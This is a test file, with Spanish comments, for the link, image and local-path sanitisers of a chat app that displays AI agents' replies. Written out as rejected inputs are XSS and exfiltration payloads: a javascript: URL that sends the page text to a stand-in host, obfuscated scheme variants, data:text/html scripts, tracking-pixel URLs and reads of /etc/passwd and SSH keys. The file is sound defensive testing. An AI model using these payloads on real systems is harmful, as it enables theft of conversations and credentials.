/**
 * Lo que el chat acepta de una respuesta que escribió un agente.
 *
 * `scripts/csp.mjs` comprueba que el filtro **está**; esto comprueba que **dice lo
 * que hay que decir**. Los dos hacen falta: un filtro que se llame igual y deje
 * pasar `javascript:` pasaría el guarda entero.
 */
import assert from "node:assert/strict";
import test from "node:test";

import { destinoAbrible, imagenInerte, imagenLocal, internalTaskLink, localFilePath } from "../src/lib/links.ts";

test("un enlace interno conserva la carpeta, incluida la raíz, y no depende del espacio", () => {
  assert.deepEqual(internalTaskLink("terminus://task?workspace=w1&folder=p2&task=s3"),
    { workspace: "w1", folder: "p2", task: "s3" });
  assert.deepEqual(internalTaskLink("terminus://task?workspace=w1&folder=&task=s3"),
    { workspace: "w1", folder: "", task: "s3" });
});

test("un enlace interno no acepta otros destinos ni parámetros ambiguos", () => {
  for (const value of [
    "terminus://task?workspace=w1&folder=p2&task=s3&task=s4",
    "terminus://task?workspace=w1&folder=p2&task=s3&extra=1",
    "terminus://task?workspace=w1&task=s3",
    "terminus://task?workspace=w1&folder=../p2&task=s3",
    "terminus://task?workspace=w1&folder=p2&task=s3#fragment",
    "terminus://task/path?workspace=w1&folder=p2&task=s3",
    "terminus://other?workspace=w1&folder=p2&task=s3",
    "terminus://task?workspace=w1&folder=p2&task=%0As3",
    "https://example.test/?workspace=w1&folder=p2&task=s3",
  ]) assert.equal(internalTaskLink(value), null, value);
});

test("un enlace interno se reconoce donde `URLSearchParams.size` no existe", () => {
  const size = Object.getOwnPropertyDescriptor(URLSearchParams.prototype, "size");
  assert.ok(size, "este Node ya no trae `size`: la prueba no simula nada");
  delete (URLSearchParams.prototype as { size?: number }).size;
  try {
    assert.deepEqual(internalTaskLink("terminus://task?workspace=w1&folder=p2&task=s3"),
      { workspace: "w1", folder: "p2", task: "s3" });
    assert.equal(internalTaskLink("terminus://task?workspace=w1&folder=p2&task=s3&extra=1"), null);
    assert.equal(internalTaskLink("terminus://task?workspace=w1&folder=p2&task=s3&task=s4"), null);
  } finally {
    Object.defineProperty(URLSearchParams.prototype, "size", size);
  }
});

test("solo pasa el destino que abriría un navegador", () => {
  for (const bueno of [
    "https://ejemplo.test/informe",
    "http://intranet.local/q3",
    "HTTPS://EJEMPLO.TEST/A",
    "mailto:alguien@ejemplo.test",
  ]) {
    assert.equal(destinoAbrible(bueno), bueno, bueno);
  }
});

test("lo que ejecuta, lo que trae su propio documento y lo que es de la app, no", () => {
  for (const malo of [
    // El que se midió ejecutando: cambió el título, sacó el texto de la
    // conversación y alcanzó `window.__TAURI_INTERNALS__`.
    'javascript:fetch("http://ajeno.test/?d="+document.body.innerText)',
    "JavaScript:alert(1)",
    // El navegador borra tabuladores y saltos antes de resolver el esquema, así
    // que esto ES `javascript:` para él. Una lista de lo prohibido no lo vería.
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    " javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "blob:http://localhost/1234",
    // Los de la propia app: la frontera con Rust no es un destino de enlace.
    "tauri://localhost/x",
    "ipc://localhost/borrar",
    "asset://localhost/etc/passwd",
    // Y lo que no es una cadena: `solid-markdown` entrega la propiedad tal cual.
    "",
    "/relativo",
    "#ancla",
  ]) {
    assert.equal(destinoAbrible(malo), null, JSON.stringify(malo));
  }
  for (const nada of [undefined, null, 42, {}, ["https://ejemplo.test"]]) {
    assert.equal(destinoAbrible(nada), null, JSON.stringify(nada));
  }
});

test("un destino larguísimo se recorta en vez de viajar entero", () => {
  const largo = "https://ejemplo.test/?d=" + "x".repeat(5000);
  assert.equal(destinoAbrible(largo)!.length, 2000);
});

test("solo se pinta la imagen que viene dentro del mensaje", () => {
  const gif = "data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==";
  assert.equal(imagenInerte(gif), gif);
  // Un SVG cargado por `<img>` corre en modo estático seguro: sin scripts y sin
  // referencias externas. No es una vía.
  assert.equal(imagenInerte("data:image/svg+xml;base64,PHN2Zy8+"), "data:image/svg+xml;base64,PHN2Zy8+");
});

test("una imagen remota no se pinta, que es lo que salía sin un clic", () => {
  for (const malo of [
    "http://ajeno.test/pixel.gif?d=SALARIOS-Q3",
    "https://ajeno.test/pixel.gif?d=SALARIOS-Q3",
    "//ajeno.test/pixel.gif",
    "/assets/logo.png",
    // `data:` que no es una imagen: el `<img>` no lo pintaría, pero la regla es
    // de lo que se acepta, no de lo que el navegador acabaría haciendo.
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(1)",
  ]) {
    assert.equal(imagenInerte(malo), null, malo);
  }
  for (const nada of [undefined, null, 0, {}]) {
    assert.equal(imagenInerte(nada), null, JSON.stringify(nada));
  }
});

test("las rutas locales del Markdown conservan espacios y caracteres codificados", () => {
  const path = "/Users/persona/Library/Application Support/artefactos/finalizar tarea.html";
  assert.equal(localFilePath(path), path);
  assert.equal(localFilePath(encodeURI(path)), path);
  assert.equal(localFilePath("/tmp/dise%C3%B1o%20final.html"), "/tmp/diseño final.html");
  assert.equal(localFilePath("/tmp/avance%2520.html"), "/tmp/avance%20.html");
  assert.equal(localFilePath("C:/Users/persona/Mis%20documentos/demo.html"), "C:/Users/persona/Mis documentos/demo.html");
  assert.equal(localFilePath(String.raw`C:\Users\persona\demo.html`), String.raw`C:\Users\persona\demo.html`);
  assert.equal(destinoAbrible(path), null);
  assert.equal(imagenInerte(path), null);
});

test("las rutas locales no aceptan esquemas, red ni controles", () => {
  for (const value of [
    undefined, null, 1, {}, "", "demo.html", "../demo.html", "#section",
    "https://example.test/demo.html", "javascript:alert(1)",
    "file:///tmp/demo.html", "data:text/html,test", "asset://localhost/tmp/demo.html",
    "//example.test/demo.html", String.raw`\\server\share\demo.html`,
    "/%2fexample.test/demo.html", "/%5cexample.test/demo.html",
    "/tmp/demo%00.html", "/tmp/demo%0a.html", "/tmp/demo%GG.html",
  ]) {
    assert.equal(localFilePath(value), null, JSON.stringify(value));
  }
});

// La salida de un `!` es texto de un programa: un `npm login` o un `gh auth
// login` imprimen la URL que hay que abrir, y el agente no la escribió en
// markdown. `enlacesEnTexto` la encuentra sin cambiar ni un carácter del resto.
test("la salida de un comando enlaza su URL sin el signo que la cierra", async () => {
  const { enlacesEnTexto } = await import("../src/lib/links.ts");
  const salida = "Login at:\nhttps://www.npmjs.com/login?next=/login/cli/5aed1a39\nDone.";
  assert.deepEqual(enlacesEnTexto(salida), [
    { texto: "Login at:\n", url: null },
    { texto: "https://www.npmjs.com/login?next=/login/cli/5aed1a39", url: "https://www.npmjs.com/login?next=/login/cli/5aed1a39" },
    { texto: "\nDone.", url: null },
  ]);
  for (const [texto, url] of [
    ["Abre https://ejemplo.test/a.", "https://ejemplo.test/a"],
    ["(ver https://ejemplo.test/a)", "https://ejemplo.test/a"],
    ["ver https://es.wikipedia.org/wiki/Foo_(bar), luego", "https://es.wikipedia.org/wiki/Foo_(bar)"],
    ["en <https://ejemplo.test/a> y", "https://ejemplo.test/a"],
    ["\"https://ejemplo.test/a\";", "https://ejemplo.test/a"],
  ]) {
    const trozos = enlacesEnTexto(texto);
    assert.deepEqual(trozos.filter((t) => t.url).map((t) => t.url), [url], texto);
    assert.equal(trozos.map((t) => t.texto).join(""), texto, texto);
  }
});

test("la salida de un comando no enlaza lo que el chat no abriría", async () => {
  const { enlacesEnTexto } = await import("../src/lib/links.ts");
  for (const texto of [
    "javascript:alert(1)",
    "file:///etc/passwd",
    "ftp://ejemplo.test/a",
    "https://",
    `https://ejemplo.test/${"a".repeat(2100)}`,
    "sin enlaces",
    "",
  ]) {
    const trozos = enlacesEnTexto(texto);
    assert.ok(trozos.every((t) => t.url === null), texto.slice(0, 40));
    assert.equal(trozos.map((t) => t.texto).join(""), texto);
  }
});

test("una imagen en disco se pinta por su ruta absoluta", () => {
  assert.equal(imagenLocal("/Users/yo/captura%20uno.png"), "/Users/yo/captura uno.png");
  assert.equal(imagenLocal("file:///tmp/a.JPG"), "/tmp/a.JPG");
  assert.equal(imagenLocal("file:///C:/tmp/a.webp"), "C:/tmp/a.webp");
  assert.equal(imagenLocal("C:\\tmp\\a.svg"), "C:\\tmp\\a.svg");
});

test("una ruta que no es imagen, relativa o de red no se pide al disco", () => {
  for (const malo of [
    "/Users/yo/.ssh/id_ed25519",
    "/etc/passwd",
    "captura.png",
    "./captura.png",
    "//servidor/a.png",
    "\\\\servidor\\a.png",
    "file://servidor/a.png",
    "https://ajeno.test/a.png",
    "/a%0A.png",
  ]) {
    assert.equal(imagenLocal(malo), null, malo);
  }
});
